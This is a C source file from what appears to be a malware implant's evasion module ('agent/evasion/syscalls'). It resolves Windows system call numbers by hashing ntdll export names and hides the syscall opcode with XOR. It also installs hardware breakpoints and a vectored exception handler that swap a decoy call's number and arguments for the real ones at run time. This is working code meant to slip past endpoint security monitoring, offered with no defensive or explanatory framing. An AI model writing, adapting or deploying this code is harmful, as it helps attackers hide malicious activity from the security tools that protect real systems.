//
// Created by Brendan Ortiz on 7/19/2024.
//

#include "../../../../headers/agent/evasion/syscalls/syscalls.h"

#include <intrin.h>

#include "../../../../headers/agent/evasion/PeParsing/evasive.h"
#include <stdio.h>

pSYS_ENTRY_LIST g_SyscallList = NULL;
pBENIGN_ENTRY_LIST g_BenignSyscallList = NULL;
TAMPERED_SYSCALL g_TamperedSyscall = { 0 };
CRITICAL_SECTION g_CriticalSection = { 0 };
PVOID g_VehHandler = NULL;
volatile unsigned short g_SYSCALL_OPCODE = 0x405D; // 0x050F ^ 0x2325
#if defined(_WIN64)
#define SEARCH_BYTES 0x8b4c
#else
#define SEARCH_BYTES 0x00b8
#endif

BOOL PopulateSyscallLists() {

    PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
    PDWORD				        pdwFunctionNameArray		    = NULL;
    PDWORD				        pdwFunctionAddressArray		= NULL;
    PWORD				        pwFunctionOrdinalArray		= NULL;

    if(g_SyscallList == NULL)
        g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we do not already have memory reserved for our list

    if(g_BenignSyscallList == NULL)
        g_BenignSyscallList = (pBENIGN_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(BENIGN_ENTRY_LIST)); // we do not already have memory reserved for our list

    if(g_SyscallList->u32Count && g_BenignSyscallList->u32Count)
        return TRUE; // our lists are already populated

    pExportDirectory = GetExportDirectoryAddress(agent->apis->hNtdll);

    pdwFunctionNameArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNames);
    pdwFunctionAddressArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfFunctions);
    pwFunctionOrdinalArray	= (PWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNameOrdinals);

    // Store Zw* syscalls addresses
    for (int i = 0; i < pExportDirectory->NumberOfNames; i++){

        LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);

        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) { // we've found a syscall name.
            ULONG_PTR uAddress = (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]); // obtain address pointer
            DWORD wBytes = *(DWORD*)uAddress; //obtain the first 2 bytes of the func.
            DWORD64 dw64Hash = Rotr64HashA(pFunctionName); //obtain the function hash

            g_SyscallList->Entries[g_SyscallList->u32Count].dw64Hash	= dw64Hash; // populate our reg syscall list no matter what
            g_SyscallList->Entries[g_SyscallList->u32Count].uAddress	= uAddress;
            g_SyscallList->u32Count++;

            if((wBytes & SEARCH_BYTES) == SEARCH_BYTES) { // we've found a benign syscall. populate the entry in benign list.
                for(int j = 0; j < 0x20; j++) { //loop until we find the syscall.
                    wBytes = *(DWORD*)(uAddress + j); // update bytes.
                    if((wBytes & 0x000000B8) == 0x000000B8) { // syscall found.
                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].dw64Hash	= dw64Hash; //populate our benign syscall.
                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress	= uAddress;
                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(DWORD*)(uAddress + j + 1);
                        g_BenignSyscallList->u32Count++;
                        break;
                    }
                }
            }

        }
    }

    // Sort Zw* syscalls addresses in ascending order
    // bubble sort addresses.
    for (int i = 0; i < g_SyscallList->u32Count - 0x01; i++){

        for (int j = 0; j < g_SyscallList->u32Count - i - 0x01; j++){

            if (g_SyscallList->Entries[j].uAddress > g_SyscallList->Entries[j + 1].uAddress) {

                SYSCALL_ENTRY TempEntry = { .dw64Hash = g_SyscallList->Entries[j].dw64Hash, .uAddress = g_SyscallList->Entries[j].uAddress };

                g_SyscallList->Entries[j].dw64Hash = g_SyscallList->Entries[j + 1].dw64Hash;
                g_SyscallList->Entries[j].uAddress = g_SyscallList->Entries[j + 1].uAddress;

                g_SyscallList->Entries[j + 1].dw64Hash = TempEntry.dw64Hash;
                g_SyscallList->Entries[j + 1].uAddress = TempEntry.uAddress;

            }
        }
    }

    // sort our list of benign syscalls by SSN instead of address.
    // bubble sort SSNs. This will inherently give us the addresses in the correct order.
    // additionally, the SSN will become the index of the syscall in the list.
    // when we randomly choose a benign syscall to hook, we will use the SSN as the index.
    for (int i = 0; i < g_BenignSyscallList->u32Count - 0x01; i++){

        for (int j = 0; j < g_BenignSyscallList->u32Count - i - 0x01; j++){

            if (g_BenignSyscallList->Entries[j].SSN > g_BenignSyscallList->Entries[j + 1].SSN) {

                BENIGN_SYSCALL_ENTRY TempEntry = { .dw64Hash = g_BenignSyscallList->Entries[j].dw64Hash, .uAddress = g_BenignSyscallList->Entries[j].uAddress, .SSN = g_BenignSyscallList->Entries[j].SSN };

                g_BenignSyscallList->Entries[j].dw64Hash = g_BenignSyscallList->Entries[j + 1].dw64Hash;
                g_BenignSyscallList->Entries[j].uAddress = g_BenignSyscallList->Entries[j + 1].uAddress;
                g_BenignSyscallList->Entries[j].SSN = g_BenignSyscallList->Entries[j + 1].SSN;

                g_BenignSyscallList->Entries[j + 1].dw64Hash = TempEntry.dw64Hash;
                g_BenignSyscallList->Entries[j + 1].uAddress = TempEntry.uAddress;
                g_BenignSyscallList->Entries[j + 1].SSN = TempEntry.SSN;

            }
        }
    }

    return TRUE; // populated and sorted.
}

DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {

    if(!PopulateSyscallLists())
        return 0x00;

    for (int i = 0; i < g_SyscallList->u32Count; i++) {
        if (g_SyscallList->Entries[i].dw64Hash == dw64Hash)
            return i;
    }

    return 0x00;
}

DWORD FetchSSNFromSyscallEntriesViaAddress(ULONG_PTR pAddress) {
    if(!PopulateSyscallLists())
        return 0x00;

    for(int i = 0; i< g_SyscallList->u32Count; i++) {
        if(g_SyscallList->Entries[i].uAddress == pAddress)
            return i;
    }

    return 0x00;
}

VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uParam3, ULONG_PTR uParam4,
    ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA,
    ULONG_PTR uParamB, DWORD dwSyscallNumber, INT Nargs) {

    EnterCriticalSection(&g_CriticalSection);
    g_TamperedSyscall.uParam1 = uParam1;
    g_TamperedSyscall.uParam2 = uParam2;
    g_TamperedSyscall.uParam3 = uParam3;
    g_TamperedSyscall.uParam4 = uParam4;
    g_TamperedSyscall.uParam5 = uParam5;
    g_TamperedSyscall.uParam6 = uParam6;
    g_TamperedSyscall.uParam7 = uParam7;
    g_TamperedSyscall.uParam8 = uParam8;
    g_TamperedSyscall.uParam9 = uParam9;
    g_TamperedSyscall.uParamA = uParamA;
    g_TamperedSyscall.uParamB = uParamB;
    g_TamperedSyscall.dwSyscallNumber = dwSyscallNumber;
    g_TamperedSyscall.Nargs = Nargs;

    LeaveCriticalSection(&g_CriticalSection);

}

BOOL InitHardwareBreakpointHooking() {
    if(g_VehHandler)
        return TRUE;

    InitializeCriticalSection(&g_CriticalSection);

    if(!(g_VehHandler = AddVectoredExceptionHandler(0x01, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandlerCallbackRoutine))) {
        return FALSE;
    }

    return TRUE;
}

BOOL HaltHardwareBreakpointHooking() {
    DeleteCriticalSection(&g_CriticalSection);

    if(g_VehHandler) {
        if(RemoveVectoredExceptionHandler(g_VehHandler) == 0x00) {
            return FALSE;
        }

        return TRUE;
    }
    return FALSE;
}

unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
    unsigned long long mask			    = (1UL << NmbrOfBitsToModify) - 1UL;
    unsigned long long NewDr7Register	= (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);
    return NewDr7Register;
}

BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTargetFuncAddress) {
    CONTEXT Context = {.ContextFlags = CONTEXT_DEBUG_REGISTERS};
    HANDLE hThread = NULL;
    BOOL bResult = FALSE;
    NTSTATUS NtStatus = -1;
    CLIENT_ID ClientID = {0};
    ClientID.UniqueThread = (HANDLE)dwThreadID;
    OBJECT_ATTRIBUTES objAttr = {0};
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    //TODO : use indirect syscalls and native functions for this for uber stealth.
    if((NtStatus = agent->apis->pNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &ClientID)) != 0x00) {
        goto _END_OF_FUNC;
    }

    if(!GetThreadContext(hThread, &Context)) {
        goto _END_OF_FUNC;
    }

    Context.Dr0 = uTargetFuncAddress;
    Context.Dr6 = 0x00;
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x10, 0x02, 0x00); // Clear the local and global exact breakpoints
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x12, 0x02, 0x00); // Clear the local and global exact breakpoints
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x00, 0x01, 0x01); // Set the local exact breakpoint

    if(!SetThreadContext(hThread, &Context))
        goto _END_OF_FUNC;

    bResult = TRUE;

    _END_OF_FUNC:
    if(hThread)
        CloseHandle(hThread);

    return bResult;
}

BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD SSN, _In_ INT Nargs,  _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB) {

   if(!uCalledSyscallAddress || !SSN)
       return FALSE;

    PVOID pDecoySyscallInstructionAdd = NULL;
    DWORD dwRealSyscallNumber = 0x00;

    for(int i = 0; i < 0x20; i++) {
        unsigned short opcodes = *(unsigned short*)(uCalledSyscallAddress + i);
        if(opcodes == (0x4552 ^ g_SYSCALL_OPCODE)) {
            pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
            break;
        }
    }

    if(!pDecoySyscallInstructionAdd)
        return FALSE;

    dwRealSyscallNumber = SSN;

    PopulateTamperedSyscall(uParam1, uParam2, uParam3, uParam4, uParam5, uParam6, uParam7, uParam8, uParam9, uParamA, uParamB, dwRealSyscallNumber, Nargs);

    if(!InstallHardwareBreakpointHook(GetCurrentThreadId(), (ULONG_PTR)pDecoySyscallInstructionAdd))
        return FALSE;

    return TRUE;
}

LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
    BOOL bResolved = FALSE;

    if(pExceptionInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        goto _EXIT_ROUTINE;

    if((ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress != pExceptionInfo->ContextRecord->Dr0)
        goto _EXIT_ROUTINE;

    EnterCriticalSection(&g_CriticalSection);

    //TODO : add support for 32bit processes.
    //Replace Decoy SSN
    pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
    // replace decoy parms
    //pExceptionInfo->ContextRecord->Rcx = g_TamperedSyscall.uParam1;
    pExceptionInfo->ContextRecord->R10 = g_TamperedSyscall.uParam1;
    pExceptionInfo->ContextRecord->Rdx = g_TamperedSyscall.uParam2;
    pExceptionInfo->ContextRecord->R8 = g_TamperedSyscall.uParam3;
    pExceptionInfo->ContextRecord->R9 = g_TamperedSyscall.uParam4;

    //stack content BEFORE the swap


    // replace decoy parms on stack if needed.
    if(g_TamperedSyscall.Nargs > 4) {
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28) = (DWORD64)g_TamperedSyscall.uParam5;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30) = (DWORD64)g_TamperedSyscall.uParam6;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38) = (DWORD64)g_TamperedSyscall.uParam7;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40) = (DWORD64)g_TamperedSyscall.uParam8;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48) = (DWORD64)g_TamperedSyscall.uParam9;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50) = (DWORD64)g_TamperedSyscall.uParamA;
        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58) = (DWORD64)g_TamperedSyscall.uParamB;
    }

    //remove breakpoint
    pExceptionInfo->ContextRecord->Dr0 = 0ull;

    LeaveCriticalSection(&g_CriticalSection);

    bResolved = TRUE;

    _EXIT_ROUTINE:
    return (bResolved ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH);
}

